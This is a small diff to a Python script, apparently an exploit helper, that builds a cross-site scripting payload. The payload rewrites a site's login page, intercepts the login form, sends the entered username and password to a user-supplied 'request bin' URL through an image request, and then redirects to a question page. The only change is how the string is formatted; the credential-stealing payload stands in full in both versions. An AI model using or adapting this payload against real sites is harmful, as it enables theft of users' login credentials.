@@ -1,8 +1,8 @@
-template = '''(async()=>document.write(await fetch('/login.php').then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="{}"+c[0].value+"||"+c[1].value,a(()=>window.location="/do-question.php?aaid={}",1e3)}),4e3)</script>`))()'''
+template = '''(async()=>document.write(await fetch('/login.php').then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="%s"+c[0].value+"||"+c[1].value,a(()=>window.location="/do-question.php?aaid=%d",1e3)}),4e3)</script>`))()'''
 
 bin = input('request bin url: ')
 aaid = int(input('question id: '))
-code = template.format(bin, aaid)
+code = template % (bin, aaid)
 
 origin = input('origin JavaScript: ')
 print(f'upload the following code to {origin}\n')
